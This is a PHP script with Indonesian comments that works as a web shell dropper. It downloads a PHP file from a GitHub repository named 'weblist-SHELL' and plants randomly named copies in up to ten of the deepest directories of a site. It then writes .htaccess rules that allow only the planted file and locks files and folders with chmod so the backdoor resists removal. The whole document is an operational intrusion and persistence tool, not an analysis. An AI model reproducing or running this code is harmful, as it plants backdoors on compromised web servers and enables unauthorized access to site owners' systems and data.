<?php

/**
 * Fungsi untuk mencari semua direktori terdalam dalam struktur direktori yang diberikan.
 *
 * @param string $baseDir Direktori dasar untuk memulai pencarian.
 * @return array Daftar semua direktori terdalam yang ditemukan.
 */
function findAllDeepestDirs($baseDir) {
    $dirs = glob($baseDir . '/*', GLOB_ONLYDIR);
    if (!$dirs) {
        return [$baseDir]; // Jika tidak ada subdirektori, berarti ini adalah direktori terdalam
    }

    $deepestDirs = [];
    foreach ($dirs as $dir) {
        $deepestDirs = array_merge($deepestDirs, findAllDeepestDirs($dir));
    }

    return $deepestDirs;
}

/**
 * Fungsi untuk menghasilkan nama file acak dengan ekstensi .php.
 *
 * @return string Nama file acak dengan ekstensi .php.
 */
function generateRandomPhpFilename() {
    return uniqid('file_', true) . '.php';
}

// Path dasar tempat memulai pencarian direktori terdalam
$basePath = __DIR__;
$allDeepestDirs = findAllDeepestDirs($basePath);

// Memastikan tidak melebihi 10 direktori (acak jika lebih dari 10)
shuffle($allDeepestDirs);
$selectedDirs = array_slice($allDeepestDirs, 0, 10);

if (empty($selectedDirs)) {
    echo "Tidak ditemukan direktori terdalam untuk diunggah.\n";
    exit;
}

// URL sumber file yang akan diunduh
$sourceFileUrl = 'https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/wkwk.php';

// Mengunduh konten dari URL sumber sekali saja untuk efisiensi
$fileContent = file_get_contents($sourceFileUrl);
if ($fileContent === false) {
    echo "Gagal mengunduh konten dari $sourceFileUrl\n";
    exit;
}

// Melakukan upload ke setiap direktori yang dipilih
foreach ($selectedDirs as $index => $targetDir) {
    $randomFilename = generateRandomPhpFilename();
    $filePath = $targetDir . '/' . $randomFilename;

    // Memastikan direktori bisa ditulisi
    if (!is_writable($targetDir)) {
        echo "Gagal: Direktori tidak dapat ditulisi - $targetDir\n";
        continue;
    }

    // Menyimpan konten ke file dengan nama acak
    $result = file_put_contents($filePath, $fileContent);
    if ($result === false) {
        echo "Gagal menyimpan file ke $filePath\n";
        continue;
    }

    // Membuat file .htaccess untuk membatasi akses hanya ke file ini
    $htaccessContent = <<<HTACCESS
Order Deny,Allow
Deny from all
<Files "$randomFilename">
    Allow from all
</Files>
HTACCESS;

    $htaccessPath = $targetDir . '/.htaccess';
    file_put_contents($htaccessPath, $htaccessContent);

    // Mengubah hak akses file PHP dan .htaccess menjadi 0444 (hanya bisa dibaca)
    chmod($filePath, 0444);
    chmod($htaccessPath, 0444);

    // Mengubah hak akses direktori tempat file diunggah menjadi 0555 (hanya bisa dibaca dan dieksekusi)
    chmod($targetDir, 0111);

    echo "[$index] Berhasil mengunggah: $filePath\n";
    echo "[$index] .htaccess dibuat di: $htaccessPath\n";
    echo "[$index] Hak akses diubah: $filePath dan $htaccessPath (0444), Direktori: $targetDir (0555)\n";
}

?>
